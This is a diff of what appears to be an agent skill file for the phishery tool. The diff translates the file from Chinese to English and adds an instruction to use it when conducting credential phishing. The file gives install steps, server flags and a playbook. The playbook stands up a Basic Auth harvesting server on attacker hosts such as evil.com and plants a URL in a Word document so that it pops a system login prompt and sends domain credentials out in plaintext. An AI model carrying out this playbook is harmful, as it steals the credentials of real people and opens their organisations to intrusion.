@@ -2,37 +2,40 @@
 name: phishery-basicauth
 description: "Document phishing to harvest domain credentials. Signals: phishing, social engineering, fake success status codes."
 zh-signals: "phishery: 文档钓鱼收割域凭据。信号:钓鱼,社会工程,成功状态码伪装。"
+when-to-use: >-
+  Use when conducting credential phishing and you need to stand up a Basic Auth
+  harvesting server for a document that triggers system authentication prompts.
 ---
 
 # phishery
 
-- 攻击大类:C08 钓鱼与社会工程
-- 上游仓库:https://github.com/ryhanson/phishery
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C08 Phishing and Social Engineering
+- Upstream Repository: https://github.com/ryhanson/phishery
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 go install github.com/ryhanson/phishery@latest
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `phishery -u https://evil.com -c cert.pem -k key.pem` | 起 Basic Auth 钓鱼服务 |
-| `-p 443` | 端口 |
-| `-s 200` | 成功状态码伪装 |
+| `phishery -u https://evil.com -c cert.pem -k key.pem` | Stand up a Basic Auth phishing server |
+| `-p 443` | Port |
+| `-s 200` | Success status code spoofing |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 文档钓鱼收割域凭据
+### Document Phishing to Harvest Domain Credentials
 
 ```bash
 phishery -u https://login.corp.evil -c cert.pem -k key.pem
-# Word 文档插 URL https://file.corp.evil/secret.docx → 弹 Basic Auth 框,凭据明文回传
+# Insert URL https://file.corp.evil/secret.docx into a Word doc → triggers a Basic Auth prompt, credentials are exfiltrated in plaintext
 ```
 
-## 注意事项
+## Notes
 
-利用 Office 文档打开远程文件弹系统级认证框;SSL 证书要可信域名,凭据 base64 解码即得。
+Uses an Office document that opens a remote file to pop a system-level authentication prompt; the SSL certificate needs a trusted domain, and the credentials are obtained by base64-decoding them.
